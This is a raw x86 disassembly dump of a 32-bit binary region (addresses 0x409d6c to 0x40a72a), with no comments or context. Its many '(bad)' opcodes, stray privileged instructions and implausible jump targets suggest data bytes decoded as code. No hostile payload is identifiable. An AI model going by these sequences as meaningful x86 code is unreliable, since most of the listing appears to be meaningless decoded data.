  409d6c:	sub    BYTE PTR ds:[ecx],cl
  409d6f:	and    BYTE PTR [esi],ch
  409d71:	sub    BYTE PTR [ecx],cl
  409d73:	or     ch,BYTE PTR [esi]
  409d75:	sub    BYTE PTR [ecx],cl
  409d77:	or     dh,BYTE PTR [edi-0x5b968e9f]
  409d7d:	push   esi
  409d7e:	(bad)  
  409d7f:	dec    DWORD PTR [edx+0x5f707260]
  409d85:	add    al,BYTE PTR [eax]
  409d87:	add    dh,ah
  409d89:	pop    esp
  409d8a:	jb     0x409df5
  409d8c:	push   edi
  409d8d:	sbb    al,0xff
  409d8f:	push   DWORD PTR [edx+0x66]
  409d92:	inc    eax
	...
  409daf:	add    BYTE PTR [eax],al
  409db1:	add    BYTE PTR [ebp+0x65],ah
  409db4:	inc    eax
  409db5:	add    BYTE PTR [eax+ebx*1+0x18970041],bl
  409dbc:	inc    ecx
  409dbd:	add    BYTE PTR [edi-0x78ffbee8],dl
  409dc3:	sbb    BYTE PTR [ecx+0x0],al
  409dc6:	cmp    al,0x18
  409dc8:	inc    ecx
  409dc9:	add    ah,dl
  409dcb:	gs inc eax
  409dcd:	add    BYTE PTR [eax+eax*2],al
  409dd0:	inc    eax
  409dd1:	add    cl,ch
  409dd3:	aas    
  409dd4:	inc    eax
  409dd5:	add    cl,bl
  409dd7:	add    DWORD PTR [eax],eax
  409dd9:	add    al,dl
  409ddb:	ds dec edi
  409ddd:	push   edx
  409dde:	jmp    0x409e13
  409de0:	pop    eax
  409de1:	pop    edi
  409de2:	idiv   DWORD PTR [esi]
  409de4:	push   ecx
  409de5:	push   esi
  409de6:	popa   
  409de7:	dec    edi
  409de8:	pop    esi
  409de9:	dec    eax
  409dea:	mov    ebx,0xd5f5352
  409def:	repz add eax,DWORD PTR [eax]
  409df2:	or     eax,0xe8699540
  409df7:	cmp    DWORD PTR [edi-0x30909501],ebp
  409dfd:	push   ebx
  409dfe:	mov    ebp,0x1c2df4fd
  409e03:	pop    ss
  409e04:	add    eax,DWORD PTR [eax]
  409e06:	or     eax,0xe152b667
  409e0b:	push   ss
  409e0c:	add    eax,DWORD PTR [eax]
  409e0e:	or     eax,0xd53c056
  409e13:	imul   edi,DWORD PTR [ebp+0x41],0x0
	...
  409e31:	add    BYTE PTR [eax],al
  409e33:	add    ch,ch
  409e35:	data16 repz xor bh,bl
  409e39:	data16 repz xor dl,BYTE PTR [edi]
  409e3d:	pop    ss
  409e3e:	add    eax,DWORD PTR [eax]
  409e40:	or     eax,0xed41bd89
  409e45:	push   ss
  409e46:	add    eax,DWORD PTR [eax]
  409e48:	or     eax,0xd7203e7
  409e4d:	mov    esi,0xc00d6803
  409e52:	add    esp,DWORD PTR [edx+0xd]
  409e55:	rol    BYTE PTR [ebx],1
  409e57:	je     0x409e66
  409e59:	fild   DWORD PTR [ebx]
  409e5b:	push   esp
  409e5c:	or     eax,0xd0003d3
  409e61:	fiadd  WORD PTR [ebx]
  409e63:	ins    BYTE PTR es:[edi],dx
  409e64:	or     eax,0xd62040e
  409e69:	clc    
  409e6a:	add    ebp,DWORD PTR [ebp+ecx*1-0x15]
  409e6e:	add    eax,DWORD PTR [eax]
  409e70:	or     eax,0xd6f0403
  409e75:	cli    
  409e76:	add    esp,DWORD PTR [ecx+0xd]
  409e79:	repz add ebx,DWORD PTR [ebp+ecx*1+0x17]
  409e7e:	add    eax,DWORD PTR [eax]
  409e80:	or     eax,0xd417593
  409e85:	add    al,bl
  409e87:	xchg   ecx,eax
  409e88:	int3   
  409e89:	(bad)  
  409e8a:	mov    eax,0xabbcdcce
  409e8f:	add    ecx,DWORD PTR ds:0xdec2b900
  409e95:	shl    BYTE PTR [eax+0x3],0x0
	...
  409eb4:	add    BYTE PTR [eax],al
  409eb6:	or     eax,0xbfb59400
  409ebb:	retf   0xd0aa
  409ebe:	iret   
  409ebf:	rcr    DWORD PTR [edi-0x4600363f],1
  409ec5:	into   
  409ec6:	int3   
  409ec7:	shr    BYTE PTR [ecx-0x543e2a2f],1
  409ecd:	add    ecx,DWORD PTR ds:0xdeb49f00
  409ed3:	mov    dh,0xae
  409ed5:	retf   0x242a
  409ed8:	lods   al,BYTE PTR ds:[esi]
  409ed9:	(bad)  
  409eda:	mov    edi,0xcfd1a7ba
  409edf:	mov    bh,0xe8
  409ee1:	add    ecx,DWORD PTR ds:0x5cbf3400
  409ee7:	mov    ebx,0xd0423
  409eec:	sub    bh,BYTE PTR [ecx+edx*2+0x59b521bf]
  409ef3:	int3   
  409ef4:	call   0x2c40abfc
  409ef9:	mov    ecx,0xbb1cbf4d
  409efe:	inc    eax
  409eff:	mov    ecx,0x23d2cb14
  409f04:	cmp    edi,DWORD PTR [edi-0x2fc54ca6]
  409f0a:	ret    0x3c23
  409f0d:	mov    dh,0x46
  409f0f:	mov    bl,0x29
  409f11:	mov    ecx,0xbf1a23b2
  409f16:	dec    ebp
  409f17:	into   
  409f18:	sub    DWORD PTR [eax+eax*1+0x0],edi
	...
  409f37:	add    BYTE PTR [edx-0x40e6ffdd],ah
  409f3d:	mov    dl,0x4f
  409f3f:	sbb    esi,ecx
  409f41:	iret   
  409f42:	inc    edx
  409f43:	mov    cl,0xe
  409f45:	add    BYTE PTR [eax],al
  409f47:	mov    ecx,0xaf4fb25c
  409f4c:	mov    bh,0xb5
  409f4e:	inc    ebx
  409f4f:	jmp    0xb4409f62
  409f54:	mov    eax,ds:0xee944cd
  409f59:	add    BYTE PTR [eax],al
  409f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f5c:	xchg   ebp,eax
  409f5d:	mov    esi,0xe9d4e
  409f62:	add    BYTE PTR [ebp-0x16b5417f],dh
  409f68:	push   cs
  409f69:	add    BYTE PTR [eax],al
  409f6b:	stos   BYTE PTR es:[edi],al
  409f6c:	xor    DWORD PTR [ebx+0xee958],0xc03c9d00
  409f76:	inc    edx
  409f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f78:	push   cs
  409f79:	add    BYTE PTR [eax],al
  409f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f7c:	ds iret 
  409f7e:	dec    eax
  409f7f:	sahf   
  409f80:	pop    eax
  409f81:	into   
  409f82:	jmp    FWORD PTR [ecx]
  409f84:	fidiv  WORD PTR [ebp+ecx*2-0x3135dc]
  409f8b:	cmp    BYTE PTR [esi+ecx*8-0x403bdf01],dh
  409f92:	inc    ebx
  409f93:	jmp    0x25409fa6
  409f98:	aam    0xb6
  409f9a:	inc    esp
  409f9b:	sbb    eax,0x0
	...
  409fb8:	add    BYTE PTR [eax],al
  409fba:	les    esp,FWORD PTR [edx]
  409fbc:	dec    DWORD PTR [edx-0x62]
  409fbf:	xchg   esp,eax
  409fc0:	ins    DWORD PTR es:[edi],dx
  409fc1:	or     al,0x72
  409fc3:	scas   al,BYTE PTR es:[edi]
  409fc4:	push   0xff227f0e
  409fc9:	sbb    DWORD PTR [ebx-0x43ef886f],esp
  409fcf:	popf   
  409fd0:	outs   dx,BYTE PTR ds:[esi]
  409fd1:	add    BYTE PTR [edx],al
  409fd3:	outs   dx,BYTE PTR ds:[esi]
  409fd4:	arpl   WORD PTR fs:[eax-0x5b9191ad],bx
  409fdb:	(bad)  
  409fdc:	(bad)  
  409fdd:	inc    DWORD PTR [edi]
  409fdf:	outs   dx,DWORD PTR ds:[esi]
  409fe0:	ins    DWORD PTR es:[edi],dx
  409fe1:	je     0x40a03c
  409fe3:	jo     0x40a058
  409fe5:	sub    eax,0x676d5750
  409fea:	pop    eax
  409feb:	push   esi
  409fec:	(bad)  
  409fed:	call   FWORD PTR [eax-0x74]
  409ff0:	pusha  
  409ff1:	outs   dx,BYTE PTR ds:[esi]
  409ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ff3:	pop    eax
  409ff4:	fs jb  0x40a008
  409ff7:	pop    ecx
  409ff8:	ins    DWORD PTR es:[edi],dx
  409ff9:	arpl   WORD PTR [ebx+0x5a],dx
  409ffc:	push   0xfffe4b6e
  40a001:	jmp    FWORD PTR [ecx-0x6a8d9972]
  40a007:	pop    edx
  40a008:	add    BYTE PTR fs:[edi-0x70918baa],al
  40a00f:	push   edi
  40a010:	arpl   WORD PTR [eax],ax
  40a012:	jg     0x40a06b
  40a014:	fs jo  0x40a068
  40a017:	pop    ebx
  40a018:	imul   ebp,DWORD PTR [ecx-0x66],0x57
  40a01c:	(bad)  
  40a01d:	inc    DWORD PTR [eax]
	...
  40a03b:	add    BYTE PTR [edi+0x59736e52],al
  40a041:	cld    
  40a042:	(bad)  
  40a043:	(bad)  
  40a044:	fadd   QWORD PTR [edx+0x41]
  40a047:	add    BYTE PTR [edi-0x2dffbf6d],ch
  40a04d:	xchg   edx,eax
  40a04e:	inc    eax
  40a04f:	add    BYTE PTR [edi],al
  40a051:	cld    
  40a052:	cmp    DWORD PTR [eax],eax
  40a054:	cld    
  40a055:	sti    
  40a056:	dec    esp
  40a057:	add    BYTE PTR [eax],dh
  40a059:	cld    
  40a05a:	cmp    al,BYTE PTR [eax]
  40a05c:	(bad)  
  40a05e:	dec    ebp
  40a05f:	add    BYTE PTR [esi],al
  40a061:	cld    
  40a062:	dec    ebp
  40a063:	add    bl,bh
  40a065:	sti    
  40a066:	dec    ebp
  40a067:	add    BYTE PTR ds:0xd3b03ef,cl
  40a06d:	dec    esi
  40a06e:	add    edi,DWORD PTR [ebx]
  40a070:	or     eax,0xd5703eb
  40a075:	push   eax
  40a076:	add    eax,DWORD PTR [eax]
  40a078:	or     eax,0xd680326
  40a07d:	cld    
  40a07e:	add    ebp,DWORD PTR [ebp+ecx*1+0x4b]
  40a082:	add    esi,DWORD PTR [ebx]
  40a084:	or     eax,0xd2e0405
  40a089:	xor    eax,DWORD PTR [ebx]
  40a08b:	ins    BYTE PTR es:[edi],dx
  40a08c:	or     eax,0xd000363
  40a091:	xchg   bl,cl
  40a093:	inc    esi
  40a094:	call   0xeaae6f03
  40a099:	popa   
  40a09a:	mov    cl,0x45
  40a09c:	loop   0x40a100
  40a09e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a09f:	add    BYTE PTR fs:[eax],al
	...
  40a0be:	mov    edi,0xb573a466
  40a0c3:	push   ss
  40a0c4:	add    eax,DWORD PTR [eax]
  40a0c6:	or     eax,0xd41b9ae
  40a0cb:	mov    ah,0x45
  40a0cd:	inc    ecx
  40a0ce:	or     eax,0xd4145bc
  40a0d3:	aad    0x45
  40a0d5:	inc    ecx
  40a0d6:	or     eax,0xd41b9ce
  40a0db:	aam    0x45
  40a0dd:	inc    ecx
  40a0de:	or     eax,0xd414e6a
  40a0e3:	push   edi
  40a0e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e5:	inc    ecx
  40a0e6:	or     eax,0xd41402c
  40a0eb:	loop   0x40a113
  40a0ed:	inc    ecx
  40a0ee:	or     eax,0xd4126e4
  40a0f3:	mov    cl,0x3
  40a0f5:	jae    0x40a104
  40a0f7:	out    0x3,eax
  40a0f9:	jb     0x40a108
  40a0fb:	sub    eax,DWORD PTR [ebx]
  40a0fd:	cs or  eax,0x31040d00
  40a103:	add    BYTE PTR ds:0xe4000d04,cl
  40a109:	or     eax,0x3e8f600
  40a10e:	or     eax,0x170eb900
  40a113:	repz repnz add ecx,DWORD PTR ds:0x929bcc00
  40a11b:	and    ah,bl
  40a11d:	or     eax,0xe423000d
	...
  40a13e:	add    BYTE PTR [eax],al
  40a140:	and    BYTE PTR [eax],0x13
  40a143:	add    al,0xd
  40a145:	add    dh,bl
  40a147:	mov    al,0xfd
  40a149:	call   FWORD PTR [eax]
  40a14b:	in     eax,dx
  40a14c:	and    ch,bh
  40a14e:	(bad)  
  40a14f:	xchg   esi,eax
  40a150:	es jmp 0x40a155
  40a153:	add    al,0xd
  40a155:	add    BYTE PTR [eax+0x76],bh
  40a158:	lea    ebp,[esi+0x56]
  40a15b:	ja     0x40a0f9
  40a15d:	jnp    0x40a1da
  40a15f:	lea    esi,[ecx+esi*2+0x7e]
  40a163:	mov    esp,DWORD PTR [ebp+0x74]
  40a166:	pusha  
  40a167:	add    DWORD PTR [eax-0x6b96998a],0xffffff8c
  40a16e:	jb     0x40a100
  40a170:	test   DWORD PTR [ebp+0x61],edi
  40a173:	jbe    0x40a1cf
  40a175:	call   DWORD PTR [edx-0x613e3542]
  40a17b:	(bad)  
  40a17c:	imul   eax,DWORD PTR [esi],0x2a
  40a17f:	into   
  40a180:	push   ebp
  40a181:	add    BYTE PTR [eax+eax*2+0x2dd238d6],bh
  40a188:	repz adc al,0xb6
  40a18b:	adc    esi,eax
  40a18d:	adc    ebx,DWORD PTR [ebx-0x4adf0dd5]
  40a193:	add    ecx,DWORD PTR ds:0xf5bc0000
  40a199:	adc    ah,bh
  40a19b:	xchg   ebp,eax
  40a19c:	push   eax
  40a19d:	inc    ecx
  40a19e:	call   0xdb87f659
  40a1a3:	mov    dh,0x0
	...
  40a1c1:	add    BYTE PTR [esi],cl
  40a1c3:	add    BYTE PTR [eax],al
  40a1c5:	lods   al,BYTE PTR ds:[esi]
  40a1c6:	inc    ebp
  40a1c7:	inc    ebx
  40a1c8:	aam    0x91
  40a1ca:	lock sbb al,dh
  40a1cd:	xchg   ecx,eax
  40a1ce:	add    BYTE PTR [esp+edi*8],ch
  40a1d1:	lods   al,BYTE PTR ds:[esi]
  40a1d2:	clc    
  40a1d3:	cs out dx,al
  40a1d5:	and    dl,0x2d
  40a1d8:	repnz cwde 
  40a1da:	push   cs
  40a1db:	add    BYTE PTR [eax],al
  40a1dd:	or     eax,0x630e177
  40a1e2:	ins    BYTE PTR es:[edi],dx
  40a1e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1e4:	fsubr  QWORD PTR gs:[esp+edx*8+0x33]
  40a1e9:	jmp    0xf40a1fc
  40a1ee:	pusha  
  40a1ef:	lock add edi,esp
  40a1f2:	pop    edi
  40a1f3:	add    BYTE PTR [edi],dl
  40a1f5:	or     BYTE PTR [edx],dh
  40a1f7:	push   cs
  40a1f8:	push   cs
  40a1f9:	in     al,dx
  40a1fa:	inc    edi
  40a1fb:	push   cs
  40a1fc:	sbb    edx,eax
  40a1fe:	adc    eax,esi
  40a200:	cmp    ebx,ebx
  40a202:	sbb    eax,0x3f31605
  40a207:	std    
  40a208:	or     dl,ah
  40a20a:	xor    eax,DWORD PTR [ecx]
  40a20c:	or     esi,ecx
  40a20e:	inc    ecx
  40a20f:	jecxz  0x40a249
  40a211:	mov    dh,0x32
  40a213:	pop    ds
  40a214:	(bad)  
  40a215:	jle    0x40a257
  40a217:	fist   WORD PTR [edx-0x6a]
  40a21a:	into   
  40a21b:	into   
  40a21c:	inc    ebp
  40a21d:	pop    ecx
  40a21e:	test   eax,0xd3434bc5
  40a223:	mov    bh,0x43
  40a225:	cmp    eax,DWORD PTR [eax]
	...
  40a243:	add    al,cl
  40a245:	push   ds
  40a246:	call   edx
  40a248:	xor    BYTE PTR [edi],ah
  40a24a:	jecxz  0x40a24c
  40a24c:	rcr    edi,1
  40a24e:	in     eax,0x0
  40a250:	lea    edi,[esi-0x76ac4258]
  40a256:	mov    esp,0xa6bc91aa
  40a25b:	add    bl,dl
  40a25d:	jb     0x40a2bd
  40a25f:	and    al,0xe2
  40a261:	cmp    eax,0x31de205b
  40a266:	dec    edi
  40a267:	add    BYTE PTR [edi-0x12],dh
  40a26a:	loope  0x40a259
  40a26c:	and    esp,ebx
  40a26e:	in     al,dx
  40a26f:	rcr    BYTE PTR [ecx],1
  40a271:	in     eax,0xe8
  40a273:	stc    
  40a274:	mov    ebp,?
  40a276:	mov    edi,0x274ec
  40a27b:	add    BYTE PTR [esi-0x5d5b5e61],cl
  40a281:	mov    ecx,0xad9e90b8
  40a286:	mov    ebx,0xd9d40900
  40a28b:	leave  
  40a28c:	sbb    edx,ebx
  40a28e:	leave  
  40a28f:	fcomp  QWORD PTR [esi]
  40a291:	(bad)  
  40a293:	test   ah,0xdf
  40a296:	loop   0x40a296
  40a298:	int3   
  40a299:	cli    
  40a29a:	iret   
  40a29b:	ficom  DWORD PTR [edi]
  40a29d:	jmp    0xf856898d
  40a2a2:	mov    ds:0xc2def2cb,eax
  40a2a7:	hlt    
	...
  40a2c4:	add    BYTE PTR [eax],al
  40a2c6:	or     BYTE PTR [ecx-0x2f252c28],dh
  40a2cc:	fmul   st(3),st
  40a2ce:	icebp  
  40a2cf:	fstp   st(2)
  40a2d1:	(bad)  [edx+eax*1]
  40a2d4:	add    BYTE PTR [eax],al
  40a2d6:	data16 mov es,WORD PTR [ebp-0x6b7e7768]
  40a2dd:	xor    BYTE PTR [ebp+0xd99849a],0x27
  40a2e4:	add    eax,DWORD PTR [eax]
  40a2e6:	or     eax,0x96998c90
  40a2eb:	stos   BYTE PTR es:[edi],al
  40a2ec:	test   DWORD PTR [ebp-0x7b875a31],ebx
  40a2f2:	or     eax,0x417daed0
  40a2f7:	fcom   DWORD PTR [ecx+esi*1-0x6a0ebb]
  40a2fe:	mov    edx,0xb1f02285
  40a303:	mov    BYTE PTR [ecx],dl
  40a305:	out    dx,al
  40a306:	mov    esp,DWORD PTR gs:[ebx]
  40a309:	dec    BYTE PTR ds:0x97e3118d
  40a30f:	call   0xfd21:0x9656f31b
  40a316:	or     eax,0xa28675aa
  40a31b:	add    BYTE PTR [eax+0x79d89182],0x85
  40a322:	xchg   esp,eax
  40a323:	daa    
  40a324:	add    eax,DWORD PTR [eax]
  40a326:	or     eax,0xcd36e5
	...
  40a347:	add    BYTE PTR [edx+0xdc13dea],dl
  40a34d:	iret   
  40a34e:	pop    ss
  40a34f:	jmp    DWORD PTR [ecx-0x41]
  40a352:	sbb    eax,0x3dfe44ef
  40a357:	clc    
  40a358:	ds or  al,0x1c
  40a35b:	out    0x36,al
  40a35d:	or     al,0x1d
  40a35f:	aad    0x52
  40a361:	or     eax,0xf32ee923
  40a366:	adc    ebx,ebp
  40a368:	dec    esi
  40a369:	sbb    DWORD PTR [esi],edx
  40a36b:	imul   DWORD PTR [esp+esi*8]
  40a36e:	dec    esp
  40a36f:	iret   
  40a370:	xor    ah,ah
  40a372:	dec    edi
  40a373:	aam    0xde
  40a375:	or     ebp,DWORD PTR ds:0xbfffc8e3
  40a37b:	add    al,0xd
  40a37d:	add    BYTE PTR [esi-0x5e],al
  40a380:	daa    
  40a381:	fild   WORD PTR [edx]
  40a383:	aam    0x57
  40a385:	mov    al,ds:0xd337e041
  40a38a:	inc    ebx
  40a38c:	lods   al,BYTE PTR gs:[esi]
  40a38e:	or     esi,eax
  40a390:	daa    
  40a391:	out    0xf,al
  40a393:	xchg   edx,eax
  40a394:	inc    ecx
  40a395:	fdivrp st(2),st
  40a397:	aam    0x5b
  40a399:	pushf  
  40a39a:	and    eax,0xbdefbec
  40a39f:	(bad)  
  40a3a0:	dec    ebp
  40a3a1:	(bad)  
  40a3a2:	out    dx,eax
  40a3a3:	push   DWORD PTR [edi]
  40a3a5:	shl    BYTE PTR [ecx],0xf4
  40a3a8:	add    esi,edx
  40a3aa:	pop    es
  40a3ab:	retf   0x0
	...
  40a3ca:	dec    ecx
  40a3cb:	add    eax,0xb413f3d9
  40a3d0:	sbb    eax,0xf3fc2a0c
  40a3d5:	add    ecx,DWORD PTR ds:0x36dd1900
  40a3db:	call   0xd37e80ba
  40a3e0:	or     edx,ebp
  40a3e2:	push   0x1c
  40a3e4:	xor    DWORD PTR [esi],esi
  40a3e6:	cmp    ecx,DWORD PTR [eax+0x23]
  40a3e9:	add    al,0xd
  40a3eb:	add    cl,ch
  40a3ed:	add    ecx,DWORD PTR ds:0x18f2e600
  40a3f3:	or     BYTE PTR [edx-0x19160f6a],dh
  40a3f9:	loope  0x40a3e5
  40a3fb:	xchg   ebx,eax
  40a3fc:	add    DWORD PTR [esi],eax
  40a3fe:	or     BYTE PTR [eax],al
  40a400:	mov    DWORD PTR [edi+ebp*4+0xdc3a69a],ebx
  40a407:	in     eax,0xbc
  40a409:	rcr    DWORD PTR [ebx-0x141b3a5d],1
  40a40f:	fdivp  st(7),st
  40a411:	loop   0x40a40f
  40a413:	or     BYTE PTR [ecx+0x78],dh
  40a416:	in     eax,0xf9
  40a418:	sbb    bh,bl
  40a41a:	adc    BYTE PTR [ecx],al
  40a41c:	pop    ecx
  40a41d:	pop    ss
  40a41e:	or     eax,0x11e21eee
  40a423:	dec    DWORD PTR [edx]
  40a425:	cmp    BYTE PTR [eax+0x6f12a9e],ch
  40a42b:	pop    es
  40a42c:	add    ecx,ebp
	...
  40a44a:	add    BYTE PTR [eax],al
  40a44c:	fadd   DWORD PTR [ebx]
  40a44e:	(bad)  
  40a451:	fdivr  QWORD PTR [eax]
  40a453:	inc    ecx
  40a454:	mov    eax,0x99215aee
  40a459:	mov    al,ds:0xd76b1c70
  40a45e:	pop    ebx
  40a45f:	add    esi,DWORD PTR [ecx-0x57]
  40a462:	ja     0x40a46e
  40a464:	mov    ecx,0x5fb2ce8
  40a469:	or     ebx,DWORD PTR [edi+ecx*8-0x3b]
  40a46d:	les    edi,FWORD PTR [ecx]
  40a46f:	(bad)  
  40a470:	test   ebx,eax
  40a472:	xor    BYTE PTR [eax+0x58ffce59],bh
  40a478:	xor    DWORD PTR ds:0x851c45e5,ebp
  40a47e:	mov    fs,WORD PTR [edx+0x3a]
  40a481:	pop    ss
  40a482:	out    0x4b,eax
  40a484:	nop
  40a485:	sub    al,0xc2
  40a487:	cs adc eax,0xcf2fc01e
  40a48d:	xor    eax,esi
  40a48f:	pop    ss
  40a490:	hlt    
  40a491:	inc    esi
  40a492:	xlat   BYTE PTR ds:[ebx]
  40a493:	adc    dl,ch
  40a495:	cmp    eax,ecx
  40a497:	jmp    0x9140a4aa
  40a49c:	xchg   ecx,eax
  40a49d:	xchg   esp,eax
  40a49e:	jl     0x40a435
  40a4a0:	je     0x40a49e
  40a4a2:	adc    eax,0x7e9e7afa
  40a4a7:	add    BYTE PTR [esi+0x6d5d7215],cl
  40a4ad:	dec    esp
  40a4ae:	pop    ebp
  40a4af:	dec    ecx
	...
  40a4cc:	add    BYTE PTR [eax],al
  40a4ce:	mov    bh,0x40
  40a4d0:	jl     0x40a530
  40a4d2:	mov    al,ds:0x37435344
  40a4d7:	add    al,0x0
  40a4d9:	add    BYTE PTR [eax-0x6b5e575e],bl
  40a4df:	lods   eax,DWORD PTR ds:[esi]
  40a4e0:	ror    dl,0x83
  40a4e3:	stos   DWORD PTR es:[edi],eax
  40a4e4:	mov    esi,0xa7c98aa3
  40a4e9:	xchg   BYTE PTR [edi-0x69],ah
  40a4ec:	mov    ds:0x827f359d,al
  40a4f1:	mov    al,ds:0x89989561
  40a4f6:	mov    WORD PTR [ebp+0x73030000],es
  40a4fc:	outs   dx,DWORD PTR ds:[esi]
  40a4fd:	push   0xfffffff9
  40a4ff:	dec    edx
  40a500:	jge    0x40a57b
  40a502:	adc    al,0x5e
  40a504:	jge    0x40a568
  40a506:	cld    
  40a507:	push   edx
  40a508:	jne    0x40a586
  40a50a:	or     eax,0x743c7c6d
  40a50f:	(bad)  
  40a510:	(bad)  
  40a511:	call   FWORD PTR [edi]
  40a513:	aas    
  40a514:	inc    ebx
  40a515:	pop    esi
  40a516:	push   ebp
  40a517:	jne    0x40a562
  40a519:	dec    ebp
  40a51a:	mov    eax,0xa0564954
  40a51f:	pop    ebp
  40a520:	inc    ecx
  40a521:	dec    eax
  40a522:	adc    DWORD PTR [edi+0x48],0xf306800
  40a529:	add    esp,DWORD PTR [esi+edi*8-0x1]
  40a52d:	call   DWORD PTR [ebx+0xa0b69e]
	...
  40a54f:	add    BYTE PTR [eax-0x285a4d5e],bh
  40a555:	test   eax,0xbbdcbfa7
  40a55a:	lahf   
  40a55b:	mov    eax,0xba5ac60d
  40a560:	fldenv [si-0x78]
  40a564:	mov    cs,WORD PTR [ebp-0x3f926f82]
  40a56a:	jp     0x40a503
  40a56c:	cdq    
  40a56d:	fsub   QWORD PTR [edx-0x57]
  40a570:	cdq    
  40a571:	fsubr  DWORD PTR [eax-0x5e]
  40a574:	mov    al,0x63
  40a576:	pop    eax
  40a577:	mov    ds:0x1c92b3,al
  40a57c:	or     eax,0x2a32e5f0
  40a581:	mov    dh,0xe3
  40a583:	xor    esp,DWORD PTR [ebx]
  40a585:	repz cdq 
  40a587:	cmp    dl,BYTE PTR [eax]
  40a589:	or     cl,bh
  40a58b:	dec    edx
  40a58c:	inc    ebp
  40a58d:	or     bl,ah
  40a58f:	xor    BYTE PTR [eax-0xc],bl
  40a592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a593:	es in  al,dx
  40a595:	sbb    eax,0x49215eb8
  40a59a:	aad    0x2e
  40a59c:	hlt    
  40a59d:	and    eax,0x27a2ffb1
  40a5a2:	add    eax,DWORD PTR [eax]
  40a5a4:	or     eax,0xef23c938
  40a5a9:	sti    
  40a5aa:	int    0xc
  40a5ac:	push   cs
  40a5ad:	pop    ss
  40a5ae:	add    eax,0xff21fc0e
  40a5b3:	inc    DWORD PTR [eax]
	...
  40a5d1:	add    bl,ah
  40a5d3:	call   edx
  40a5d5:	xor    al,bh
  40a5d7:	cmp    eax,0x15fa11f9
  40a5dc:	clc    
  40a5dd:	pop    edi
  40a5de:	std    
  40a5df:	adc    esi,esi
  40a5e1:	inc    ebp
  40a5e2:	add    ebp,DWORD PTR [ecx]
  40a5e4:	add    esp,DWORD PTR [eax-0x1d]
  40a5e7:	or     DWORD PTR [edi-0x6ea94f8c],ebp
  40a5ed:	and    bh,ch
  40a5ef:	add    al,0x91
  40a5f1:	es icebp 
  40a5f3:	jmp    DWORD PTR [eax+edx*4-0x62226f5f]
  40a5fa:	sbb    dh,dl
  40a5fc:	xchg   edx,eax
  40a5fd:	(bad)  
  40a5fe:	fst    QWORD PTR [edx-0x604f6583]
  40a604:	mov    cl,0xcb
  40a606:	(bad)  
  40a607:	hlt    
  40a608:	stos   DWORD PTR es:[edi],eax
  40a609:	leave  
  40a60a:	adc    al,0xfd
  40a60c:	fisttp QWORD PTR [eax]
  40a60e:	dec    esp
  40a60f:	add    al,0xe9
  40a611:	add    ecx,DWORD PTR ds:0xf610d800
  40a617:	sbb    esp,eax
  40a619:	push   esi
  40a61a:	loope  0x40a644
  40a61c:	fcom   QWORD PTR [edx]
  40a61e:	or     eax,0x3cb01f00
  40a623:	mov    dl,0x18
  40a625:	retf   
  40a626:	aas    
  40a627:	add    bl,ah
  40a629:	or     al,0x24
  40a62b:	or     ecx,esp
  40a62d:	add    eax,0xefdf0221
  40a632:	or     bl,dl
  40a634:	sub    cl,dh
	...
  40a652:	add    BYTE PTR [eax],al
  40a654:	idiv   DWORD PTR [edi+ebp*1+0x30e30fc8]
  40a65b:	enter  0x24b,0x2e
  40a65f:	dec    BYTE PTR [edi]
  40a661:	repz call 0x2440b36a
  40a667:	mov    edi,0xcc18bcd1
  40a66c:	(bad)  
  40a66e:	lods   eax,DWORD PTR ds:[esi]
  40a66f:	add    edx,DWORD PTR [ecx]
  40a671:	clc    
  40a672:	add    BYTE PTR [eax],cl
  40a674:	sar    edi,cl
  40a676:	add    bh,dh
  40a678:	out    0xff,eax
  40a67a:	ret    0xb8b3
  40a67d:	lods   eax,DWORD PTR ds:[esi]
  40a67e:	mov    ah,0xc6
  40a680:	ret    
  40a681:	neg    DWORD PTR [edx+edi*4-0x48654946]
  40a688:	loope  0x40a679
  40a68a:	jmp    DWORD PTR [esi-0x54bff480]
  40a690:	jp     0x40a656
  40a692:	pop    es
  40a693:	jmp    0x40a70e
  40a695:	add    eax,0x74a15700
  40a69a:	lahf   
  40a69b:	js     0x40a63b
  40a69d:	xor    DWORD PTR [ebx-0x7c87298a],eax
  40a6a3:	pusha  
  40a6a4:	xchg   edi,eax
  40a6a5:	test   BYTE PTR [ebx-0x737eb19c],cl
  40a6ab:	pusha  
  40a6ac:	xchg   ecx,eax
  40a6ad:	jg     0x40a638
  40a6af:	pop    ebp
  40a6b0:	inc    esi
  40a6b1:	mov    ebx,DWORD PTR [edi-0x7e80704b]
  40a6b7:	xchg   esp,eax
	...
  40a6d4:	add    BYTE PTR [eax],al
  40a6d6:	dec    DWORD PTR [esi]
  40a6d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d9:	ror    DWORD PTR [esi],cl
  40a6db:	add    BYTE PTR [eax],al
  40a6dd:	pop    ds
  40a6de:	test   eax,0xa65066a2
  40a6e3:	in     eax,0x7a
  40a6e5:	dec    esi
  40a6e6:	scas   al,BYTE PTR es:[edi]
  40a6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6e8:	imul   ecx,DWORD PTR [esi+ebp*2-0x23],0x6a
  40a6ed:	ss fwait
  40a6ef:	call   0x1770:0x9094e576
  40a6f6:	mov    DWORD PTR [ebp+eiz*2+0x7da17d0f],ecx
  40a6fd:	es int3 
  40a6ff:	add    eax,DWORD PTR [eax]
  40a701:	xchg   ebx,eax
  40a702:	dec    edx
  40a703:	das    
  40a704:	shl    DWORD PTR [edx-0x517bbf2b],0xd5
  40a70b:	ds iret 
  40a70d:	xchg   edx,eax
  40a70e:	int3   
  40a70f:	test   bl,al
  40a711:	cmp    al,0xf8
  40a713:	inc    ecx
  40a714:	shl    DWORD PTR [eiz*1+0xe7cc03d],cl
  40a71b:	add    BYTE PTR [eax],al
  40a71d:	clc    
  40a71e:	outs   dx,BYTE PTR ds:[esi]
  40a71f:	shl    DWORD PTR [edi],1
  40a721:	add    BYTE PTR [edx+0x2c],dl
  40a724:	arpl   WORD PTR [edx+edx*1],sp
  40a727:	cmp    ebp,DWORD PTR [eax+ebp*1]
  40a72a:	push   cs
